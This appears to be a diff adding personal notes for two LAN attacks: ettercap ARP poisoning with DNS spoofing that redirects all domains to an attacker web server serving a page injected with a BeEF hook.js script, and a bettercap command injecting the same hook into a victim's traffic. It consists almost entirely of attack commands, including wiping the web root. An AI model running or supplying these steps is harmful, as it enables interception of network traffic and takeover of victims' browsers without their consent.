@@ -1,0 +1,41 @@
+# 1-ST
+
+gedit /etc/ettercap/etter.dns # Make a Backup
+vim /etc/ettercap/etter.dns.BKUP # Copy all from /etc/ettercap/etter.dns
+
+gedit /etc/ettercap/etter.dns
+Write :
+  * A 192.168.0.11
+
+cd /var/www/html
+rm *
+git clone https://github.com/laykatz/Mic-Index.git
+copy all from folder to ./
+change in index.html:
+  <script src="Add Beef Hook Here"></script>
+  ------------------------------------------
+  <script src="http://192.168.0.1:3000/hook.js"></script>
+
+cd /usr/share/beef-xss
+./beef
+
+                                                WIFI IP
+ettercap -i wlan0 -T -q -P dns_spoof -M ARP /192.168.0.1// /192.168.0.67//
+
+
+# 2 -ND
+
+gedit /etc/ettercap/etter.dns # Make a Backup
+vim /etc/ettercap/etter.dns.BKUP # Copy all from /etc/ettercap/etter.dns
+
+gedit /etc/ettercap/etter.dns
+Write :
+  * A 192.168.0.11
+
+cd /usr/share/beef-xss
+./beef
+
+etter.dns 192.168.0.11
+etter     192.168.0.1
+
+bettercap -I wlan0 -T 192.168.0.67 --proxy-module injectjs --js-url "http://192.168.0.11:3000/hook.js"
